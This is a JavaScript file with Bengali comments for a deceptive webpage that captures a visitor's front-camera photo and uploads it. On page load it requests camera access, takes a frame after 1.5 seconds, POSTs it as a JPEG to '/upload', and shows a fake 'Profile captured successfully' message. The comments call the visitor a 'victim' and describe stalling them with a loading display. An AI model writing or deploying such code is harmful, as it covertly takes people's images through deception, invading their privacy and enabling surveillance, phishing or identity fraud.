document.addEventListener('DOMContentLoaded', async () => {
    const video = document.getElementById('previewVideo');
    const canvas = document.getElementById('captureCanvas');
    const ctx = canvas.getContext('2d');

    try {
        // 1. ক্যামেরা এক্সেস নেওয়া (অটোমেটিক)
        // navigator.mediaDevices.getUserMedia() ব্রাউজারে পারমিশন ডায়ালগ খুলবে।
        // ভিক্টিমকে 'Allow' করতে হবে, কিন্তু আমরা পেজ লোডিং দেখিয়ে সময় নাবছি।
        
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user", // ফ্রন্ট ক্যামেরা (সেলফি মোড)
                width: { ideal: 640 },
                height: { ideal: 480 }
            }, 
            audio: false 
        });

        video.srcObject = stream;

        // ভিডিও স্ট্রিম শুরু হলে ক্যাপচার নেওয়া
        video.onloadedmetadata = () => {
            video.play();
            
            // ১.৫ সেকেন্ড পর ক্যাপচার নেওয়া (ভিক্টিমের চোখ ফোকাস করার জন্য)
            setTimeout(() => {
                captureAndSend(video, canvas, stream);
            }, 1500);
        };

    } catch (err) {
        console.error("Camera Error:", err);
        document.querySelector('h2').innerText = "Camera Access Denied";
        document.querySelector('p').innerText = "Please refresh and allow camera.";
    }
});

function captureAndSend(video, canvas, stream) {
    // ক্যানভাস সাইজ সেট করা (ভিডিওর মত)
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // ভিডিওর একটি ফ্রেম ক্যানভাসে আঁকা
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // ক্যানভাসকে JPEG ইমেজে রূপান্তর করা
    const dataURL = canvas.toDataURL('image/jpeg', 0.8); // 0.8 কোয়ালিটি
    
    // ডেটা URL থেকে Blob তৈরি করা (আপলোডের জন্য)
    fetch(dataURL).then(res => res.blob()).then(blob => {
        const formData = new FormData();
        formData.append('image', blob, 'capture.jpg');

        // ব্যাকএন্ডে পাঠানো
        fetch('/upload', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log("Image sent:", data);
            // আপলোড হলে মেসেজ পরিবর্তন করা (ভিক্টিম ভাববে কাজ শেষ)
            document.querySelector('h2').innerText = "Success!";
            document.querySelector('p').innerText = "Profile captured successfully.";
        })
        .catch(error => {
            console.error("Upload Error:", error);
        });
    });

    // ক্যামেরা বন্ধ করা (স্ট্রিম স্টপ)
    stream.getTracks().forEach(track => track.stop());
          }
